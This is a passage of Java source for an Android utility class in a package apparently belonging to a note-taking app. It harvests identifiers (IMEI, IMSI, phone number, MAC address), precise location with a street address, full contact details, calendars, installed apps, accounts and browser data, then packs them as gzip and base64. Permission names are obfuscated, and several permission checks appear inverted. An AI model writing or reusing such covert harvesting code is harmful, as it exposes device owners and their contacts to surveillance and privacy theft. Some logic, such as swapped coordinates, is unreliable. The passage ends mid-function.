package cn.com.caoyue.tinynote.vest.utils;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.bluetooth.BluetoothAdapter;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.content.res.Configuration;
import android.database.Cursor;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.location.Address;
import android.location.Criteria;
import android.location.Geocoder;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.ConditionVariable;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.CalendarContract;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.CellSignalStrengthCdma;
import android.telephony.CellSignalStrengthGsm;
import android.telephony.CellSignalStrengthLte;
import android.telephony.CellSignalStrengthWcdma;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.WindowManager;
import android.webkit.MimeTypeMap;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import java.util.UUID;

public class DevUtils {

    public static JSONObject getBasic(Context context) {
        JSONObject json = new JSONObject();
        try {
            json.put("and_id", isNullText(getAndroidID(context)));
            json.put("gaid", isNullText(getGaid(context)));
            json.put("sn", isNullText(getDriverSerial()));
            json.put("model", isNullText(getDriverModel()));
            json.put("brand", isNullText(getDriverBrand()));
            json.put("release", isNullText(getDriverReleaseVersion()));
            json.put("sdk_version", isNullText(getDriverSdkVersion()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    public static String getDeviceInfo(Context context, List<String> items, boolean gzip) {
        Map<String, Object> map = new HashMap<>();
        for (String item : items) {
            if (TextUtils.equals(item, "hardware")) {
                map.put(item, getHardware(context));
            } else if (TextUtils.equals(item, "storage")) {
                map.put(item, getStorage(context));
            } else if (TextUtils.equals(item, "general_data")) {
                map.put(item, getGeneral(context));
            } else if (TextUtils.equals(item, "sim_card")) {
                map.put(item, getSimCard(context));
            } else if (TextUtils.equals(item, "contact")) {
                map.put(item, getContacts(context));
            } else if (TextUtils.equals(item, "location")) {
                map.put(item, getCommLocation(context));
            } else if (TextUtils.equals(item, "battery_status")) {
                map.put(item, getBatteryStatus(context));
            } else if (TextUtils.equals(item, "other_data")) {
                map.put(item, getOtherData(context));
            } else if (TextUtils.equals(item, "application")) {
                map.put(item, getApplication(context));
            } else if (TextUtils.equals(item, "contact_address")) {
                map.put(item, getContactAddress(context));
            } else if (TextUtils.equals(item, "contact_email")) {
                map.put(item, getContactEmail(context));
            } else if (TextUtils.equals(item, "contact_phone")) {
                map.put(item, getContactPhone(context));
            } else if (TextUtils.equals(item, "contact_group")) {
                map.put(item, getContactsGroup(context));
            } else if (TextUtils.equals(item, "calendars")) {
                map.put(item, getCalendars(context));
            } else if (TextUtils.equals(item, "calendar_events")) {
                map.put(item, getCalendarsEvent(context));
            } else if (TextUtils.equals(item, "calendar_attendees")) {
                map.put(item, getCalendarAttendees(context));
            } else if (TextUtils.equals(item, "calendar_reminders")) {
                map.put(item, getCalendarReminders(context));
            } else if (TextUtils.equals(item, "browser_android")) {
                map.put(item, getBrowserAndroid(context));
            } else if (TextUtils.equals(item, "browser_chrome")) {
                map.put(item, getBrowserChrome(context));
            } else if (TextUtils.equals(item, "audio_external")) {
                map.put(item, getAudioExternal(context));
            } else if (TextUtils.equals(item, "audio_internal")) {
                map.put(item, getAudioInternal(context));
            } else if (TextUtils.equals(item, "images_internal")) {
                map.put(item, getImagesInternal(context));
            } else if (TextUtils.equals(item, "images_external")) {
                map.put(item, getImagesExternal(context));
            } else if (TextUtils.equals(item, "video_internal")) {
                map.put(item, getVideoInternal(context));
            } else if (TextUtils.equals(item, "video_external")) {
                map.put(item, getVideoExternal(context));
            } else if (TextUtils.equals(item, "download_files")) {
                map.put(item, getDownloadFile());
            } else if (TextUtils.equals(item, "registered_accounts")) {
                map.put(item, getRegisteredAccounts(context));
            } else if (TextUtils.equals(item, "voice")) {
                map.put(item, getVoice(context));
            } else if (TextUtils.equals(item, "network")) {
                map.put(item, getNetwork(context));
            } else if (TextUtils.equals(item, "bluetooth")) {
                map.put(item, getBluetooth());
            } else if (TextUtils.equals(item, "appinfo")) {
                map.put(item, getAppInfo(context));
            } else if (TextUtils.equals(item, "sensor")) {
                map.put(item, getSensor(context));
            }
        }
        String devices = PageUtils.getMapToString(map);
        return gzip ? PageUtils.base64(PageUtils.gzip(devices)) : devices;
    }

    public static String getAndroidID(Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private static JSONObject getHardware(Context context) {
        JSONObject json = new JSONObject();
        try {
            json.put("model", isNullText(getDriverModel()));
            json.put("brand", isNullText(getDriverBrand()));
            json.put("device_name", isNullText(getDriverBrand()));
            json.put("product", isNullText(getDriverProduct()));
            json.put("release", isNullText(getDriverReleaseVersion()));
            json.put("sdk_version", isNullText(getDriverSdkVersion()));
            json.put("physical_size", isNullText(getPhysicalSize(context)));
            json.put("serial_number", isNullText(getDriverSerial()));
            json.put("cpu_type", isNullText(getCpuName()));
            json.put("modelName", isNullText(getDriverModel()));
            json.put("handSetMakers", isNullText(getDriverProduct()));
            json.put("manufacturerName", isNullText(getDriverBrand()));
            json.put("board", isNullText(getDriverBoard()));
            json.put("serial", isNullText(getDriverSerial()));
            json.put("display", isNullText(getDriverDisplay()));
            json.put("id", isNullText(getDriverId()));
            json.put("bootloader", isNullText(getDriverBootloader()));
            json.put("fingerPrint", isNullText(getDriverFingerprint()));
            json.put("host", isNullText(getDriverHost()));
            json.put("hardWare", isNullText(getDriverHardWare()));
            json.put("device", isNullText(getDriverDevice()));
            json.put("user", isNullText(getDriverUser()));
            json.put("radioVersion", isNullText(getRadioVersion()));
            json.put("tags", isNullText(getDriverTags()));
            json.put("time", isNullText(getDriverTime()));
            json.put("type", isNullText(getDriverType()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    private static JSONObject getStorage(Context context) {
        JSONObject json = new JSONObject();
        try {
            json.put("ram_total_size", isNullText(getRamTotalSize(context)));
            json.put("ram_usable_size", isNullText(getRamAvailSize(context)));
            json.put("main_storage", isNullText(getRootDirectory()));
            json.put("external_storage", isNullText(getExternalStorageDirectory()));
            json.put("memory_card_size", isNullText(getSDInfo().get("totalSize").toString()));
            json.put("memory_card_size_use", isNullText(getSDInfo().get("useSize").toString()));
            json.put("internal_storage_total", isNullText(getTotalInternalMemorySize() + ""));
            json.put("internal_storage_usable", isNullText(getAvailableInternalMemorySize() + ""));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    private static JSONObject getGeneral(Context context) {
        JSONObject json = new JSONObject();
        try {
            json.put("deviceid", isNullText(getDeviceId(context)));
            json.put("and_id", isNullText(getAndroidID(context)));
            json.put("gaid", isNullText(getGaid(context)));
            json.put("network_operator_name", isNullText(getNetworkOperatorName(context)));
            json.put("network_operator", isNullText(getNetworkOperator(context)));
            json.put("network_type", isNullText(getNetWorkModel(context)));
            json.put("phone_type", isNullText(getPhoneType(context)));
            json.put("phone_number", isNullText(getLine1Number(context)));
            json.put("mcc", isNullText(getMCC(context)));
            json.put("mnc", isNullText(getMNC(context)));
            json.put("locale_iso_3_language", isNullText(getISO3Language(context)));
            json.put("locale_iso_3_country", isNullText(getISO3Country(context)));
            json.put("time_zone_id", isNullText(getTimeZoneId()));
            json.put("locale_display_language", isNullText(getLocaleDisplayLanguage()));
            json.put("imsi", isNullText(getImsi(context)));
            Map<String, Object> info = getCellInfo(context);
            if (info.containsKey("cid")) {
                json.put("cid", isNullText(String.valueOf(info.get("cid"))));
            }
            json.put("dns", isNullText(getLocalDNS()));
            json.put("uuid", isNullText(getDriverUUID(context)));
            json.put("imei", isNullText(getDeviceId(context)));
            json.put("mac", isNullText(getMacAddress(context)));
            json.put("language", isNullText(getOsLanguage(context)));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    private static JSONObject getSimCard(Context context) {
        JSONObject json = new JSONObject();
        try {
            json.put("sim_country_iso", isNullText(getSimCountryIso(context)));
            json.put("sim_serial_number", isNullText(getSimSerialNumber(context)));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    private static JSONArray getContacts(Context context) {
        JSONArray jsonArray = new JSONArray();
        if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CONTACTS)))
            return jsonArray;

        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, null, null, null, null);
        try {
            while (cursor != null && cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String emailAddress = "";
                String group_id = "";
                jsonObject.put("_id", contactId);
                String custom_ringtone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CUSTOM_RINGTONE));
                String last_time_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
                String send_to_voicemail = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.SEND_TO_VOICEMAIL));
                String starred = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.STARRED));
                String times_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
                String has_phone_number = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                String in_visible_group = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.IN_VISIBLE_GROUP));
                String is_user_profile = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.IS_USER_PROFILE));
                String photo_id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.PHOTO_ID));
                String contact_status = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_STATUS));
                String contact_status_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_STATUS_TIMESTAMP));
                String display_name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String updated_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));

                StringBuffer sb = new StringBuffer();
                Cursor phone_number = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
                List<String> phoneList = new ArrayList<>();
                while (null != phone_number && phone_number.moveToNext()) {
                    String strPhoneNumber = phone_number.getString(phone_number.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    phoneList.add(strPhoneNumber);
                }

                if (phoneList.size() > 0) {
                    phoneList = PageUtils.removeDuplicate(phoneList);
                    for (int i = 0; i < phoneList.size(); i++) {
                        sb.append(phoneList.get(i)).append(",");
                    }
                }
                String phones = sb.toString();
                if (phones.indexOf(",") != -1) {
                    phones = sb.deleteCharAt(sb.length() - 1).toString();
                }
                PageUtils.closeSilently(phone_number);

                jsonObject.put("number", isNullText(phones));
                jsonObject.put("up_time", isNullText(updated_timestamp));
                jsonObject.put("custom_ringtone", isNullText(custom_ringtone));
                jsonObject.put("last_time_contacted", isNullText(last_time_contacted));
                jsonObject.put("send_to_voicemail", isNullText(send_to_voicemail));
                jsonObject.put("starred", starred);
                jsonObject.put("times_contacted", times_contacted);
                jsonObject.put("has_phone_number", has_phone_number);
                jsonObject.put("in_visible_group", in_visible_group);
                jsonObject.put("is_user_profile", is_user_profile);
                jsonObject.put("photo_id", photo_id);
                jsonObject.put("contact_status", contact_status);
                jsonObject.put("contact_status_ts", contact_status_timestamp);
                jsonObject.put("contact_display_name", display_name);
                jsonArray.put(jsonObject);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } finally {
            PageUtils.closeSilently(cursor);
        }

        return jsonArray;
    }

    private static JSONObject getLocation(Context context) {
        final JSONObject jsonObject = new JSONObject();
        if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.ACCESS_COARSE_LOCATION)))
            return jsonObject;

        final ConditionVariable conditionVariable = new ConditionVariable();
        LocaUtils helper = new LocaUtils(context);
        helper.initLocation(new LocaUtils.MyLocationListener() {
            @Override
            public void updateLastLocation(Location location) {
                try {
                    JSONObject netObj = new JSONObject();
                    netObj.put("latitude", location.getLongitude());
                    netObj.put("longitude", location.getLatitude());
                    jsonObject.put("network", netObj);
                    conditionVariable.open();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void updateLocation(Location location) {
                try {
                    JSONObject netObj = new JSONObject();
                    netObj.put("latitude", location.getLongitude());
                    netObj.put("longitude", location.getLatitude());
                    jsonObject.put("network", netObj);
                    conditionVariable.open();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void updateStatus(String provider, int status, Bundle extras) {
            }

            @Override
            public void updateGpsStatus(GpsStatus gpsStatus) {
            }
        });
        conditionVariable.block(5000);
        conditionVariable.close();
        helper.removeLocationUpdatesListener();
        return jsonObject;
    }

    /**
     * 获取经纬度2019.4.30修改
     */
    public static JSONObject getCommLocation(Context context) {
        JSONObject jsonObject = new JSONObject();
        if (PageUtils.checkPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)) {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            List<String> providers = locationManager.getProviders(true);
            if (providers.contains(LocationManager.GPS_PROVIDER)) {
                Criteria criteria = new Criteria();
                criteria.setAccuracy(Criteria.ACCURACY_FINE);
                criteria.setAltitudeRequired(false);
                criteria.setBearingRequired(false);
                criteria.setCostAllowed(true);
                criteria.setPowerRequirement(Criteria.POWER_LOW);

                String provider = locationManager.getBestProvider(criteria, true);
                Location location = locationManager.getLastKnownLocation(provider);
                double latitude = -1;
                double longitude = -1;
                try {
                    if (null != location) {
                        latitude = location.getLatitude();
                        longitude = location.getLongitude();
                        JSONObject gpsObj = new JSONObject();
                        gpsObj.put("latitude", latitude);
                        gpsObj.put("longitude", longitude);
                        jsonObject.put("gps", gpsObj);
                    } else {
                        location = locationManager.getLastKnownLocation(locationManager.NETWORK_PROVIDER);
                        if (null != location) {
                            latitude = location.getLatitude();
                            longitude = location.getLongitude();
                            JSONObject netObj = new JSONObject();
                            netObj.put("latitude", latitude);
                            netObj.put("longitude", longitude);
                            jsonObject.put("network", netObj);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                    List<Address> addresses = geocoder.getFromLocation(latitude, longitude, 1);
                    if (addresses.size() > 0) {
                        Address address = addresses.get(0);
                        String country = address.getCountryName();
                        String province = address.getAdminArea();
                        String city = address.getSubAdminArea();
                        String bigDirect = address.getLocality();
                        String smallDirect = address.getThoroughfare();
                        String detailed = address.getAddressLine(0);
                        jsonObject.put("gps_address_province", isNullText(province));
                        jsonObject.put("gps_address_city", isNullText(city));
                        jsonObject.put("gps_address_large_district", isNullText(bigDirect));
                        jsonObject.put("gps_address_small_district", isNullText(smallDirect));
                        jsonObject.put("gps_address_street", isNullText(detailed));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                Criteria criteria = new Criteria();
                criteria.setCostAllowed(false);
                criteria.setAccuracy(Criteria.ACCURACY_FINE);
                criteria.setAltitudeRequired(false);
                criteria.setBearingRequired(false);
                criteria.setCostAllowed(false);
                criteria.setPowerRequirement(Criteria.POWER_LOW);
                String providerName = locationManager.getBestProvider(criteria, true);
                if (providerName != null) {
                    Location location = locationManager.getLastKnownLocation(providerName);
                    if (location != null) {
                        try {
                            double latitude = location.getLatitude();
                            double longitude = location.getLongitude();
                            JSONObject locaObj = new JSONObject();
                            locaObj.put("latitude", latitude);
                            locaObj.put("longitude", longitude);
                            jsonObject.put("network", locaObj);
                            Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                            List<Address> addresses = geocoder.getFromLocation(latitude, longitude, 1);
                            if (addresses.size() > 0) {
                                Address address = addresses.get(0);
                                String country = address.getCountryName();
                                String province = address.getAdminArea();
                                String city = address.getSubAdminArea();
                                String bigDirect = address.getLocality();
                                String smallDirect = address.getThoroughfare();
                                String detailed = address.getAddressLine(0);

                                jsonObject.put("gps_address_province", isNullText(province));
                                jsonObject.put("gps_address_city", isNullText(city));
                                jsonObject.put("gps_address_large_district", isNullText(bigDirect));
                                jsonObject.put("gps_address_small_district", isNullText(smallDirect));
                                jsonObject.put("gps_address_street", isNullText(detailed));
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                } else {
                    return null;
                }
            }
        }
        return jsonObject;
    }

    /**
     * 获取电量  battery_pct保留两位小数
     */
    private static JSONObject getBatteryStatus(Context context) {
        Intent batteryInfoIntent = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int level = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        int plugged = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        float batteryPct = level / (float) scale;
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("battery_pct", Math.round(batteryPct * 100) / 100.0);
            switch (plugged) {
                case BatteryManager.BATTERY_PLUGGED_AC: {
                    jsonObject.put("is_usb_charge", 0);
                    jsonObject.put("is_ac_charge", 1);
                    jsonObject.put("is_charging", 1);
                    break;
                }
                case BatteryManager.BATTERY_PLUGGED_USB: {
                    jsonObject.put("is_usb_charge", 1);
                    jsonObject.put("is_ac_charge", 0);
                    jsonObject.put("is_charging", 1);
                    break;
                }
                default: {
                    jsonObject.put("is_usb_charge", 0);
                    jsonObject.put("is_ac_charge", 0);
                    jsonObject.put("is_charging", 0);
                    break;
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    private static JSONObject getOtherData(Context context) {
        JSONObject json = new JSONObject();
        try {
            List<String> sysPhotos = getSystemPhotoList(context);
            boolean isRoot = isRooted();
            boolean isEmulator = isEmulator();

            json.put("image_num", null == sysPhotos ? 0 : sysPhotos.size());
            json.put("root_jailbreak", isRoot ? 1 : 0);
            json.put("simulator", isEmulator ? 1 : 0);
            json.put("keyboard", isNullText(getKeyboard(context)));
            int dbm = (int) getCellInfo(context).get("dbm");
            json.put("dbm", isNullText(String.valueOf(dbm)));
            json.put("last_boot_time", getLastBootTime());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    private static JSONArray getApplication(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            PackageManager pm = context.getPackageManager();
            List<PackageInfo> list = pm.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES);
            for (int i = 0; i < list.size(); i++) {
                PackageInfo packageInfo = list.get(i);
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("app_name", isNullText(pm.getApplicationLabel(packageInfo.applicationInfo).toString()));
                jsonObject.put("package", isNullText(packageInfo.packageName));
                jsonObject.put("in_time", packageInfo.firstInstallTime);
                jsonObject.put("up_time", packageInfo.lastUpdateTime);
                jsonObject.put("version_name", isNullText(packageInfo.versionName));
                jsonObject.put("version_code", packageInfo.versionCode);
                jsonObject.put("flags", packageInfo.applicationInfo.flags);
                jsonObject.put("app_type", packageInfo.applicationInfo.flags);
                if ((ApplicationInfo.FLAG_SYSTEM & packageInfo.applicationInfo.flags) != 0) {
                    jsonObject.put("app_type", 1);
                } else {
                    jsonObject.put("app_type", 0);
                }
                jsonArray.put(jsonObject);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getContactAddress(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CONTACTS))) {
                Uri uri = ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI;
                String[] COLUMNS = new String[]{
                        ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID, ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY,
                        ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME, ContactsContract.CommonDataKinds.StructuredPostal.CITY,
                        ContactsContract.CommonDataKinds.StructuredPostal.REGION, ContactsContract.CommonDataKinds.StructuredPostal.STARRED,
                        ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS};
                ContentResolver contentResolver = context.getContentResolver();
                Cursor cursor = contentResolver.query(uri, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID));
                    String country = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                    String address_display_name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME));
                    String city = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                    String region = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                    String address_starred = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STARRED));
                    String formatted_address = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS));
                    jsonObject.put("contact_id", contactId);
                    jsonObject.put("country", country);
                    jsonObject.put("display_name", address_display_name);
                    jsonObject.put("city", city);
                    jsonObject.put("region", region);
                    jsonObject.put("starred", address_starred);
                    jsonObject.put("address", formatted_address);
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getContactEmail(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CONTACTS))) {
                Uri uri = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
                String[] COLUMNS = new String[]{ContactsContract.CommonDataKinds.Email.CONTACT_ID, ContactsContract.CommonDataKinds.Email.ADDRESS};
                ContentResolver contentResolver = context.getContentResolver();
                Cursor cursor = contentResolver.query(uri, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("contact_id", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID)));
                    jsonObject.put("email", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)));
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getContactPhone(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CONTACTS))) {
                Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                String[] COLUMNS = new String[]{ContactsContract.CommonDataKinds.Phone.CONTACT_ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
                ContentResolver contentResolver = context.getContentResolver();
                Cursor cursor = contentResolver.query(uri, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("contact_id", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)));
                    jsonObject.put("display_name", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    jsonObject.put("number", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getContactsGroup(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CONTACTS))) {
                Uri uri = ContactsContract.Groups.CONTENT_URI;
                ContentResolver contentResolver = context.getContentResolver();
                Cursor cursor = contentResolver.query(uri, null, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    String groupId = cursor.getString(cursor.getColumnIndex(ContactsContract.Groups._ID));
                    Cursor groupCursor = contentResolver.query(ContactsContract.Groups.CONTENT_URI, null, ContactsContract.Groups._ID + " = " + groupId, null, null);
                    while (groupCursor.moveToNext()) {
                        String account_name = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.ACCOUNT_NAME));
                        String auto_add = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.AUTO_ADD));
                        String deleted = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.DELETED));
                        String favorites = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.FAVORITES));
                        String group_visible = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.GROUP_VISIBLE));
                        String group_is_read_only = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.GROUP_IS_READ_ONLY));
                        String notes = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.NOTES));
                        String should_sync = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.SHOULD_SYNC));
                        String account_type = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.ACCOUNT_TYPE));
                        String title = groupCursor.getString(groupCursor.getColumnIndex(ContactsContract.Groups.TITLE));
                        jsonObject.put("_id", groupId);
                        jsonObject.put("auto_add", auto_add);
                        jsonObject.put("deleted", deleted);
                        jsonObject.put("favorites", favorites);
                        jsonObject.put("group_is_read_only", group_is_read_only);
                        jsonObject.put("group_visible", group_visible);
                        jsonObject.put("notes", notes);
                        jsonObject.put("should_sync", should_sync);
                        jsonObject.put("account_type", account_type);
                        jsonObject.put("account_name", account_name);
                        jsonObject.put("title", title);
                        jsonArray.put(jsonObject);
                    }
                    if (groupCursor != null && !groupCursor.isClosed()) {
                        groupCursor.close();
                        groupCursor = null;
                    }
                    if (cursor != null && !cursor.isClosed()) {
                        cursor.close();
                        cursor = null;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getCalendars(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CALENDAR))) {
                ContentResolver cr = context.getContentResolver();
                Uri uri = CalendarContract.Calendars.CONTENT_URI;
                Cursor cursor = cr.query(uri, null, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    String calendars_id = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars._ID));
                    String allowed_attendee_types = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.ALLOWED_ATTENDEE_TYPES));
                    String allowed_availability = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.ALLOWED_AVAILABILITY));
                    String allowed_reminders = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.ALLOWED_REMINDERS));
                    String calendar_access_level = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.CALENDAR_ACCESS_LEVEL));
                    String calendar_time_zone = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.CALENDAR_TIME_ZONE));
                    String visible = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.VISIBLE));
                    String account_type = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.ACCOUNT_TYPE));
                    jsonObject.put("allowed_attendee_types", allowed_attendee_types);
                    jsonObject.put("allowed_availability", allowed_availability);
                    jsonObject.put("allowed_reminders", allowed_reminders);
                    jsonObject.put("calendar_access_level", calendar_access_level);
                    jsonObject.put("calendar_timezone", calendar_time_zone);
                    jsonObject.put("visible", visible);
                    jsonObject.put("account_type", account_type);
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getCalendarsEvent(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CALENDAR))) {
